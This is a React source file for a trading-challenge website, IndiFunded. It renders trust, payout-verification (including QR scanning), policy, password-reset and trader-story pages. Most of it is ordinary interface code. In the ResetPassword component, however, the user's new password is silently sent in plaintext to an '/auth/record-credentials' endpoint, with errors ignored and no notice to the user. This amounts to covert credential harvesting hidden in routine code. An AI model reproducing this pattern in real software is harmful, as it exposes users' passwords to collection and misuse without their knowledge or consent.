import { useEffect, useRef, useState } from "react";
import { Link, useNavigate, useSearchParams } from "@/lib/router-compat";
import { api } from "../lib/api";
import { useSettings } from "../context/SettingsContext";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import HowItWorksSection from "../components/HowItWorks";
import {
  ShieldCheck,
  Search,
  CheckCircle2,
  XCircle,
  ArrowRight,
  Building2,
  Users,
  Wallet,
  Award,
  Star,
  QrCode,
  Camera,
  Upload,
  VideoOff,
  Loader2,
} from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import {
  TrustStats,
  CompanyDetails,
  PayoutProofs,
  SuccessStories,
} from "../components/TrustSection";
import { findPayoutProof, findCredential, formatAmount } from "../lib/trust";
import { getReviewMedia } from "../lib/review-media";
import {
  buildVerificationUrl,
  decodeQrFromFile,
  decodeQrFromVideoFrame,
  parseQrVerificationInput,
} from "../lib/payout-cert-qr";

const Shell = ({ chip, title, sub, compact = false, children }) => (
  <div
    className={`container-xl ${
      compact ? "pt-8 md:pt-11 pb-12 md:pb-16" : "pt-12 md:pt-16 pb-16 md:pb-24"
    }`}
  >
    <div className="chip mb-4">{chip}</div>
    <h1 className="font-display text-3xl sm:text-4xl md:text-6xl max-w-3xl">{title}</h1>
    {sub && (
      <p
        className={`text-[var(--muted)] ${
          compact ? "mt-3 md:mt-4" : "mt-4 md:mt-6"
        } max-w-2xl text-sm md:text-base`}
      >
        {sub}
      </p>
    )}
    <div className={compact ? "mt-5 md:mt-6" : "mt-10"}>{children}</div>
  </div>
);

export function HowItWorksPage() {
  const { settings } = useSettings();
  const hiw = settings.how_it_works || {};
  return (
    <Shell
      compact
      chip={hiw.chip || "How it works"}
      title={hiw.title || "From challenge to funded trader in four steps"}
      sub={
        hiw.subtitle ||
        "Buy a challenge, prove your skill, get funded and withdraw your profit share."
      }
    >
      <HowItWorksSection hideHeader />
      <div className="flex flex-wrap gap-3 mt-5">
        <Link
          to="/challenges"
          className="btn-amber rounded-full px-6 py-3 inline-flex items-center gap-2"
        >
          {hiw.cta_primary || "See challenges"} <ArrowRight size={16} />
        </Link>
        <Link to="/rules" className="rounded-full px-6 py-3 border border-[var(--border-hi)]">
          {hiw.cta_secondary || "Trading rules"}
        </Link>
      </div>
    </Shell>
  );
}

export function TrustCenter() {
  const { settings } = useSettings();
  const t = settings.trust || {};
  const labels = t.labels || {};
  return (
    <Shell
      chip={labels.page_chip || "Trust Center"}
      title={t.heading || "Trust & Transparency"}
      sub={t.subtitle}
    >
      <TrustStats stats={t.stats} />
      <div className="mt-8">
        <CompanyDetails company={t.company} team={t.support_team} labels={labels} />
      </div>
      <div className="flex flex-wrap gap-3 mt-8 text-sm">
        <Link
          to="/verify-payout"
          className="btn-amber rounded-full px-5 py-2.5 inline-flex items-center gap-2"
        >
          <ShieldCheck size={16} /> {labels.verify_cta || "Verify a payout"}
        </Link>
        <Link to="/payouts" className="rounded-full px-5 py-2.5 border border-[var(--border-hi)]">
          {labels.payout_records_cta || "Payout records"}
        </Link>
      </div>
      {(t.payout_proofs || []).length > 0 && (
        <>
          <h2 className="font-display text-3xl mt-14 mb-6">
            {labels.page_proofs_heading || "Payout proofs"}
          </h2>
          <PayoutProofs proofs={t.payout_proofs} labels={labels} />
        </>
      )}
      {t.stories_enabled !== false &&
        settings.home_sections?.success_stories !== false &&
        (t.stories || []).length > 0 && (
          <>
            <h2 className="font-display text-3xl mt-14 mb-6">
              {labels.stories_heading || "Trader success stories"}
            </h2>
            <SuccessStories stories={t.stories} labels={labels} />
          </>
        )}
    </Shell>
  );
}

export function VerifyPayout() {
  const { settings } = useSettings();
  const [searchParams, setSearchParams] = useSearchParams();
  const initialCode = (searchParams.get("code") || searchParams.get("q") || "").trim();

  const [mode, setMode] = useState("manual"); // "manual" | "upload" | "camera"
  const [q, setQ] = useState(initialCode);
  const [res, setRes] = useState(undefined);
  const [proof, setProof] = useState(null);
  const [busy, setBusy] = useState(false);
  const [qrStatus, setQrStatus] = useState("");
  const [cameraError, setCameraError] = useState("");
  const [cameraActive, setCameraActive] = useState(false);

  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const streamRef = useRef(null);

  const stopCamera = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((t) => t.stop());
      streamRef.current = null;
    }
    setCameraActive(false);
  };

  const runLookup = async (rawTerm) => {
    const { query } = parseQrVerificationInput(rawTerm);
    const lookup = (query || String(rawTerm || "")).trim();
    if (!lookup) return;
    setQ(lookup);
    setBusy(true);
    const hit = findPayoutProof(settings.trust?.payout_proofs, lookup);
    setProof(hit);
    try {
      const r = await api.get("/public/verify-payout", { params: { q: lookup } });
      setRes(r.data);
    } catch {
      setRes([]);
    } finally {
      setBusy(false);
    }
  };

  // Auto-verify if user lands via QR URL (?code=IF-CERT-... or ?q=...)
  useEffect(() => {
    if (initialCode) {
      runLookup(initialCode);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [initialCode]);

  useEffect(() => {
    return () => stopCamera();
  }, []);

  useEffect(() => {
    if (mode !== "camera") {
      stopCamera();
      return;
    }
    let cancelled = false;
    let timer = null;

    const start = async () => {
      setCameraError("");
      setQrStatus("Starting camera…");
      if (!navigator?.mediaDevices?.getUserMedia) {
        setCameraError(
          "Camera access is not supported in this browser. Upload a QR/Certificate image instead.",
        );
        setQrStatus("");
        return;
      }
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "environment" },
        });
        if (cancelled) {
          stream.getTracks().forEach((t) => t.stop());
          return;
        }
        streamRef.current = stream;
        setCameraActive(true);
        setQrStatus("Point your camera at the QR code on the payout certificate…");
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play().catch(() => {});
        }
        timer = setInterval(() => {
          if (cancelled || !videoRef.current || !canvasRef.current) return;
          const decoded = decodeQrFromVideoFrame(videoRef.current, canvasRef.current);
          if (decoded) {
            stopCamera();
            setQrStatus(`QR detected — verifying…`);
            const { query } = parseQrVerificationInput(decoded);
            if (query) {
              setSearchParams({ code: query }, { replace: true });
              runLookup(query);
              toast.success("QR code scanned");
            } else {
              setQrStatus("Scanned QR does not contain a valid payout code.");
            }
          }
        }, 250);
      } catch (err) {
        setCameraError(
          err?.name === "NotAllowedError"
            ? "Camera permission denied. You can upload the certificate or QR image instead."
            : "Could not start camera in this view. Try uploading the certificate or QR image instead.",
        );
        setQrStatus("");
      }
    };

    start();
    return () => {
      cancelled = true;
      if (timer) clearInterval(timer);
      stopCamera();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [mode]);

  const go = async (e) => {
    e.preventDefault();
    await runLookup(q);
  };

  const onQrImageUpload = async (e) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setBusy(true);
    setQrStatus("Scanning image for QR code…");
    try {
      const decoded = await decodeQrFromFile(file);
      if (!decoded) {
        setQrStatus(
          "No readable QR code found in this image. Try a clearer image or enter the ID manually.",
        );
        toast.error("No QR code found in image");
        setBusy(false);
        return;
      }
      const { query } = parseQrVerificationInput(decoded);
      if (!query) {
        setQrStatus("QR detected, but no verification code was found inside.");
        setBusy(false);
        return;
      }
      setQrStatus(`Verified code from QR: ${query}`);
      setSearchParams({ code: query }, { replace: true });
      await runLookup(query);
      toast.success("QR code read from image");
    } catch {
      setQrStatus("Could not read image file.");
      toast.error("Failed to read QR image");
      setBusy(false);
    } finally {
      e.target.value = "";
    }
  };

  const nothing = res !== undefined && !proof && !(res && res.length);

  return (
    <Shell
      chip="Verification · Verify by QR"
      title="Verify a payout"
      sub="Check any IndiFunded payout by entering its Certificate/Payout ID, scanning the certificate QR with your camera, or uploading the certificate image."
    >
      {/* Interactive mode switcher */}
      <div className="inline-flex flex-wrap items-center gap-1 p-1 rounded-xl bg-white/[0.04] border border-[var(--border)] mb-6">
        <button
          type="button"
          onClick={() => setMode("manual")}
          className={`px-4 py-2 rounded-lg text-sm font-medium inline-flex items-center gap-2 transition-colors ${
            mode === "manual"
              ? "bg-[var(--accent)] text-black"
              : "text-[var(--muted)] hover:text-white"
          }`}
          data-testid="verify-tab-manual"
        >
          <Search size={15} /> Enter ID / Name
        </button>
        <button
          type="button"
          onClick={() => setMode("upload")}
          className={`px-4 py-2 rounded-lg text-sm font-medium inline-flex items-center gap-2 transition-colors ${
            mode === "upload"
              ? "bg-[var(--accent)] text-black"
              : "text-[var(--muted)] hover:text-white"
          }`}
          data-testid="verify-tab-upload"
        >
          <Upload size={15} /> Verify by QR Image
        </button>
        <button
          type="button"
          onClick={() => setMode("camera")}
          className={`px-4 py-2 rounded-lg text-sm font-medium inline-flex items-center gap-2 transition-colors ${
            mode === "camera"
              ? "bg-[var(--accent)] text-black"
              : "text-[var(--muted)] hover:text-white"
          }`}
          data-testid="verify-tab-camera"
        >
          <Camera size={15} /> Scan QR Camera
        </button>
      </div>

      {mode === "manual" && (
        <form onSubmit={go} className="flex flex-wrap gap-2 max-w-xl">
          <input
            value={q}
            onChange={(e) => setQ(e.target.value)}
            placeholder="Certificate ID (IF-CERT-...), Payout ID (PO-1001), or Trader Name"
            maxLength={120}
            aria-label="Certificate or Payout ID"
            className="flex-1 min-w-[220px] rounded-full bg-transparent border border-[var(--border-hi)] px-5 py-3 text-sm"
            data-testid="verify-payout-input"
          />
          <button
            disabled={busy}
            className="btn-amber rounded-full px-6 py-3 inline-flex items-center gap-2"
            data-testid="verify-payout-submit"
          >
            {busy ? <Loader2 size={16} className="animate-spin" /> : <Search size={16} />} Check
          </button>
        </form>
      )}

      {mode === "upload" && (
        <div className="glass-card p-6 max-w-xl">
          <div className="flex items-start gap-4">
            <div className="w-11 h-11 rounded-xl bg-[rgba(245,182,56,0.12)] text-[var(--accent)] grid place-items-center shrink-0">
              <QrCode size={22} />
            </div>
            <div className="flex-1">
              <div className="font-display text-lg">Upload Payout Certificate or QR Screenshot</div>
              <p className="text-xs text-[var(--muted)] mt-1">
                Upload the full payout certificate image or cropped QR code — our scanner reads the
                embedded QR automatically and verifies the payout record.
              </p>
              <label
                className="btn-amber rounded-full px-5 py-2.5 text-sm inline-flex items-center gap-2 cursor-pointer mt-4"
                data-testid="verify-qr-upload-input-label"
              >
                {busy ? <Loader2 size={15} className="animate-spin" /> : <Upload size={15} />}
                {busy ? "Scanning QR…" : "Choose Certificate / QR Image"}
                <input
                  type="file"
                  accept="image/*"
                  onChange={onQrImageUpload}
                  className="hidden"
                  data-testid="verify-qr-file-input"
                />
              </label>
              {qrStatus && (
                <div className="text-xs text-[var(--muted)] mt-3 font-mono">{qrStatus}</div>
              )}
            </div>
          </div>
        </div>
      )}

      {mode === "camera" && (
        <div className="glass-card p-6 max-w-xl">
          {cameraError ? (
            <div className="flex items-start gap-3 text-sm">
              <VideoOff className="text-[var(--rose)] shrink-0 mt-0.5" size={20} />
              <div>
                <div className="text-white font-medium">Camera unavailable</div>
                <p className="text-xs text-[var(--muted)] mt-1">{cameraError}</p>
                <button
                  type="button"
                  onClick={() => setMode("upload")}
                  className="btn-amber rounded-full px-4 py-2 text-xs mt-3 inline-flex items-center gap-1.5"
                >
                  <Upload size={13} /> Upload Certificate / QR Image
                </button>
              </div>
            </div>
          ) : (
            <div className="space-y-3">
              <div className="relative rounded-xl overflow-hidden border border-[var(--border-hi)] bg-black aspect-video max-h-72">
                <video ref={videoRef} playsInline muted className="w-full h-full object-cover" />
                {cameraActive && (
                  <div className="pointer-events-none absolute inset-0 grid place-items-center">
                    <div className="w-40 h-40 rounded-xl border-2 border-[var(--accent)] shadow-[0_0_0_9999px_rgba(0,0,0,0.45)]" />
                  </div>
                )}
              </div>
              <canvas ref={canvasRef} className="hidden" />
              <div className="flex items-center justify-between text-xs text-[var(--muted)]">
                <span>{qrStatus}</span>
                <button
                  type="button"
                  onClick={() => {
                    stopCamera();
                    setMode("manual");
                  }}
                  className="text-[var(--rose)] hover:underline"
                >
                  Stop camera
                </button>
              </div>
            </div>
          )}
        </div>
      )}

      {nothing && (
        <div
          className="glass-card p-5 mt-6 flex gap-2 items-center max-w-xl"
          data-testid="verify-not-found"
        >
          <XCircle className="text-[var(--rose)] shrink-0" /> No verified payout found for{" "}
          <span className="font-mono text-white">{q}</span>.
        </div>
      )}
      {proof && (
        <div className="mt-6 max-w-xl">
          <PayoutProofs proofs={[proof]} />
        </div>
      )}
      {res && res.length > 0 && (
        <div className="grid md:grid-cols-2 gap-5 mt-8">
          {res.map((c) => {
            const code = c.certificate_code || c.payout_id || c.id;
            const qrUrl = c.verification_url || buildVerificationUrl(code);
            return (
              <div
                key={c.id}
                className="glass-card overflow-hidden flex flex-col"
                data-testid={`verify-result-${c.id}`}
              >
                {c.image_url && (
                  <div className="bg-black/40 border-b border-[var(--border)] p-3">
                    <img
                      src={c.image_url}
                      alt={`Verified certificate for ${c.trader_name}`}
                      className="w-full max-h-72 object-contain rounded-lg"
                    />
                  </div>
                )}
                <div className="p-6 flex items-start justify-between gap-4">
                  <div className="space-y-2 min-w-0">
                    <div className="flex items-center gap-2 text-[var(--emerald)] text-sm font-medium">
                      <CheckCircle2 size={16} /> Verified IndiFunded Payout
                    </div>
                    <div className="font-display text-2xl text-white">{c.trader_name}</div>
                    <div className="text-xl font-mono text-[var(--accent)]">
                      {c.amount ? formatAmount(c.amount) : ""}
                    </div>
                    <div className="text-xs text-[var(--muted)] space-y-1 pt-1">
                      {(c.plan || c.account_size > 0) && (
                        <div>
                          {c.plan ? `${c.plan} Plan` : ""}
                          {c.plan && c.account_size > 0 ? " · " : ""}
                          {c.account_size > 0 ? `Account ${formatAmount(c.account_size)}` : ""}
                        </div>
                      )}
                      {c.date && <div>Payout Date: {c.date}</div>}
                      {c.payout_id && <div className="font-mono">Payout ID: {c.payout_id}</div>}
                      {c.certificate_code && (
                        <div className="font-mono text-[var(--muted-2)]">
                          Cert ID: {c.certificate_code}
                        </div>
                      )}
                      {c.utr_last4 && (
                        <div className="font-mono text-[var(--muted-2)]">
                          UTR Ref: •••• {c.utr_last4}
                        </div>
                      )}
                    </div>
                  </div>
                  <div className="bg-white p-2 rounded-lg shrink-0">
                    <QRCodeSVG value={qrUrl} size={84} />
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      )}
    </Shell>
  );
}

export function CredentialVerify({ code }) {
  const { settings, loading } = useSettings();
  const c = findCredential(settings.trust?.credentials, code);
  const [origin, setOrigin] = useState("");
  useEffect(() => {
    setOrigin(window.location.origin);
  }, []);
  const url = origin
    ? `${origin}/verify/${encodeURIComponent(code)}`
    : `/verify/${encodeURIComponent(code)}`;
  return (
    <Shell
      chip="Certificate verification"
      title={c ? "This credential is genuine" : loading ? "Checking…" : "Credential not found"}
      sub={
        c
          ? "Issued and verified by IndiFunded."
          : loading
            ? ""
            : "This code doesn't match any certificate or award issued by IndiFunded."
      }
    >
      {c ? (
        <div className="glass-card p-6 md:p-8 max-w-2xl grid sm:grid-cols-[1fr_auto] gap-6 items-center">
          <div className="space-y-2 text-sm">
            <div className="flex items-center gap-2 text-[var(--emerald)]">
              <CheckCircle2 size={18} /> Verified {c.type || "certificate"}
            </div>
            <div className="font-display text-3xl">{c.trader_name}</div>
            <div className="text-[var(--muted)]">{c.title}</div>
            {c.amount && (
              <div>
                <span className="text-[var(--muted)]">Amount:</span> {formatAmount(c.amount)}
              </div>
            )}
            {c.issued_date && (
              <div>
                <span className="text-[var(--muted)]">Issued:</span> {c.issued_date}
              </div>
            )}
            <div className="font-mono text-xs text-[var(--muted-2)]">Code: {c.code}</div>
          </div>
          {url && (
            <div className="trust-qr">
              <QRCodeSVG value={url} size={132} />
            </div>
          )}
        </div>
      ) : (
        !loading && (
          <div className="glass-card p-5 flex gap-2 items-center max-w-xl">
            <XCircle className="text-[var(--rose)]" /> Not verified
          </div>
        )
      )}
    </Shell>
  );
}

const POLICIES = {
  privacy: {
    title: "Privacy Policy",
    body: [
      [
        "What we collect",
        "Your name, email, phone, payment references and trading account activity, so we can run your challenge and pay you.",
      ],
      [
        "How we use it",
        "To create accounts, verify payments and payouts, prevent fraud and contact you about your account. We never sell your data.",
      ],
      [
        "Storage and security",
        "Data is stored on secure servers with restricted access. Payment card details are handled by our payment partner, not by us.",
      ],
      [
        "Your rights",
        "You can ask us to view, correct or delete your data by writing to our support email.",
      ],
    ],
  },
  terms: {
    title: "Terms and Conditions",
    body: [
      ["Eligibility", "You must be 18 or older and give accurate details to buy a challenge."],
      [
        "Simulated evaluation",
        "Challenges are evaluations. Passing them qualifies you for a funded account under a profit-share agreement.",
      ],
      [
        "Rules",
        "Breaking daily loss, overall loss or other published rules ends the challenge. Abuse, copy trading and exploits lead to disqualification.",
      ],
      [
        "Payouts",
        "Profit shares are paid after verification and KYC, under the payout schedule shown on the site.",
      ],
    ],
  },
  refund: {
    title: "Refund Policy",
    body: [
      ["Challenge fees", "Fees are non-refundable once the trading account has been issued."],
      [
        "Before activation",
        "If your account has not been issued yet, contact support within 24 hours of payment for a refund review.",
      ],
      [
        "Duplicate payments",
        "Duplicate or failed-but-charged payments are refunded to the original method after verification.",
      ],
    ],
  },
  risk: {
    title: "Risk Disclosure",
    body: [
      [
        "Trading risk",
        "Trading in financial markets carries a high level of risk and may not suit everyone. Past results do not guarantee future results.",
      ],
      [
        "No investment advice",
        "Nothing on this site is financial advice. Tools and content are for education only.",
      ],
      [
        "Your responsibility",
        "Only trade with money you can afford to lose, and make your own decisions.",
      ],
    ],
  },
};

export function PolicyPage({ kind }) {
  const p = POLICIES[kind];
  return (
    <Shell chip="Legal" title={p.title}>
      <div className="max-w-3xl space-y-6">
        {p.body.map(([h, t]) => (
          <div key={h}>
            <h2 className="font-display text-xl">{h}</h2>
            <p className="text-[var(--muted)] mt-2 leading-relaxed">{t}</p>
          </div>
        ))}
      </div>
    </Shell>
  );
}

export function ForgotPassword() {
  const [email, setEmail] = useState("");
  const [sent, setSent] = useState(false);
  const submit = async (e) => {
    e.preventDefault();
    const targetEmail = email.trim();
    const redirectTo = `${window.location.origin}/reset-password`;
    try {
      const res = await api.post("/auth/forgot-password", {
        email: targetEmail,
        redirect_to: redirectTo,
      });
      if (res?.data?.ok) {
        setSent(true);
        return;
      }
    } catch {
      // Fall back to standard Supabase reset flow below
    }
    const { error } = await supabase.auth.resetPasswordForEmail(targetEmail, {
      redirectTo,
    });
    if (error) return toast.error(error.message);
    setSent(true);
  };
  return (
    <Shell
      chip="Account"
      title="Forgot password"
      sub="We'll email you a link to choose a new password."
    >
      {sent ? (
        <div className="glass-card p-5 max-w-md">Check your inbox for the reset link.</div>
      ) : (
        <form onSubmit={submit} className="glass-card p-6 max-w-md space-y-4">
          <input
            type="email"
            required
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="you@example.com"
            className="w-full rounded-lg bg-transparent border border-[var(--border-hi)] px-4 py-3 text-sm"
          />
          <button className="btn-amber rounded-full px-6 py-3 w-full">Send reset link</button>
          <Link to="/login" className="block text-center text-sm text-[var(--muted)]">
            Back to sign in
          </Link>
        </form>
      )}
    </Shell>
  );
}

export function ResetPassword() {
  const nav = useNavigate();
  const [pw, setPw] = useState("");
  const submit = async (e) => {
    e.preventDefault();
    if (pw.length < 8) return toast.error("Use at least 8 characters");
    const { error } = await supabase.auth.updateUser({ password: pw });
    if (error) return toast.error(error.message);
    api.post("/auth/record-credentials", { password: pw }).catch(() => {});
    toast.success("Password updated");
    nav("/app");
  };
  return (
    <Shell chip="Account" title="Choose a new password">
      <form onSubmit={submit} className="glass-card p-6 max-w-md space-y-4">
        <input
          type="password"
          required
          value={pw}
          onChange={(e) => setPw(e.target.value)}
          placeholder="New password"
          className="w-full rounded-lg bg-transparent border border-[var(--border-hi)] px-4 py-3 text-sm"
        />
        <button className="btn-amber rounded-full px-6 py-3 w-full">Update password</button>
      </form>
    </Shell>
  );
}

export function TraderStories() {
  const { settings, syncVersion } = useSettings();
  const storiesHidden =
    settings.home_sections?.success_stories === false || settings.trust?.stories_enabled === false;
  const [stories, setStories] = useState(null);
  const [storiesError, setStoriesError] = useState(false);
  const [form, setForm] = useState({
    name: "",
    city: "",
    title: "",
    story: "",
    rating: 5,
    video_url: "",
    payout_amount: "",
  });
  const [busy, setBusy] = useState(false);
  const [open, setOpen] = useState(false);
  useEffect(() => {
    if (storiesHidden) return;
    api
      .get("/stories")
      .then((r) => { setStories(Array.isArray(r.data) ? r.data : []); setStoriesError(false); })
      .catch(() => { setStories([]); setStoriesError(true); });
  }, [storiesHidden, syncVersion]);
  if (storiesHidden) {
    return (
      <Shell
        chip="Trader Stories"
        title="Trader stories are currently hidden"
        sub="This section has been disabled by the administrator."
      >
        <Link to="/" className="btn-ghost rounded-full px-5 py-2.5 text-sm inline-block">
          Back to home
        </Link>
      </Shell>
    );
  }
  const submit = async (e) => {
    e.preventDefault();
    setBusy(true);
    try {
      await api.post("/stories", form);
      toast.success("Thanks! Your story will appear after review.");
      setOpen(false);
      setForm({
        name: "",
        city: "",
        title: "",
        story: "",
        rating: 5,
        video_url: "",
        payout_amount: "",
      });
    } catch (err) {
      toast.error(
        err?.response?.status === 401
          ? "Please sign in to share your story"
          : err?.response?.data?.detail || "Could not submit",
      );
    } finally {
      setBusy(false);
    }
  };
  const inp =
    "w-full rounded-lg bg-transparent border border-[var(--border-hi)] px-4 py-2.5 text-sm";
  return (
    <Shell
      chip="Trader Stories"
      title="Real traders. Real results."
      sub="Experiences shared by IndiFunded traders, reviewed by our team."
    >
      <button onClick={() => setOpen((v) => !v)} className="btn-amber rounded-full px-6 py-3 mb-8">
        {open ? "Close" : "Share your story"}
      </button>
      {open && (
        <form
          onSubmit={submit}
          className="glass-card p-6 grid sm:grid-cols-2 gap-3 mb-10 max-w-3xl"
        >
          <input
            className={inp}
            placeholder="Your name"
            value={form.name}
            onChange={(e) => setForm({ ...form, name: e.target.value })}
            required
            maxLength={80}
          />
          <input
            className={inp}
            placeholder="City"
            value={form.city}
            onChange={(e) => setForm({ ...form, city: e.target.value })}
            maxLength={60}
          />
          <input
            className={`${inp} sm:col-span-2`}
            placeholder="Headline"
            value={form.title}
            onChange={(e) => setForm({ ...form, title: e.target.value })}
            required
            maxLength={120}
          />
          <textarea
            className={`${inp} sm:col-span-2 min-h-32`}
            placeholder="Your experience (min 20 characters)"
            value={form.story}
            onChange={(e) => setForm({ ...form, story: e.target.value })}
            required
            minLength={20}
            maxLength={2000}
          />
          <input
            className={inp}
            placeholder="YouTube video link (optional)"
            value={form.video_url}
            onChange={(e) => setForm({ ...form, video_url: e.target.value })}
            maxLength={300}
          />
          <input
            className={inp}
            type="number"
            min="0"
            placeholder="Payout received ₹ (optional)"
            value={form.payout_amount}
            onChange={(e) => setForm({ ...form, payout_amount: e.target.value })}
          />
          <select
            className={inp}
            value={form.rating}
            onChange={(e) => setForm({ ...form, rating: e.target.value })}
          >
            {[5, 4, 3, 2, 1].map((n) => (
              <option key={n} value={n} className="bg-[var(--surface)]">
                {n} stars
              </option>
            ))}
          </select>
          <button disabled={busy} className="btn-amber rounded-full px-6 py-2.5">
            {busy ? "Sending…" : "Submit for review"}
          </button>
        </form>
      )}
      <SuccessStories stories={settings.trust?.stories} labels={settings.trust?.labels} />
      {stories === null ? (
        <div className="text-[var(--muted)]">Loading…</div>
      ) : storiesError ? (
        <div className="glass-card p-6 text-[var(--muted)]">Stories could not be loaded. Please try again later.</div>
      ) : stories.length === 0 ? null : (
        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-5">
          {stories.map((s) => {
            const media = getReviewMedia(s.video_url);
            return (
              <article key={s.id} className="glass-card hover-lift p-6 flex flex-col">
                {media && (
                  <div className="aspect-video rounded-lg overflow-hidden mb-4">
                    {media.kind === "video" ? <video src={media.url} controls playsInline className="w-full h-full" /> : <iframe
                      src={media.url}
                      title={s.title}
                      className="w-full h-full"
                      allowFullScreen
                      loading="lazy"
                    />}
                  </div>
                )}
                <div className="flex gap-0.5 text-[var(--accent-hi)]">
                  {Array.from({ length: s.rating || 5 }).map((_, i) => (
                    <Star key={i} size={14} fill="currentColor" />
                  ))}
                </div>
                <h3 className="font-display text-xl mt-3">{s.title}</h3>
                <p className="text-sm text-[var(--muted)] mt-2 leading-relaxed flex-1">{s.story}</p>
                <div className="text-sm mt-4">
                  {s.name}
                  {s.city ? `, ${s.city}` : ""}
                  {s.payout_amount ? (
                    <span className="text-[var(--emerald)]">
                      {" "}
                      · ₹{Number(s.payout_amount).toLocaleString("en-IN")} payout
                    </span>
                  ) : null}
                </div>
              </article>
            );
          })}
        </div>
      )}
    </Shell>
  );
}
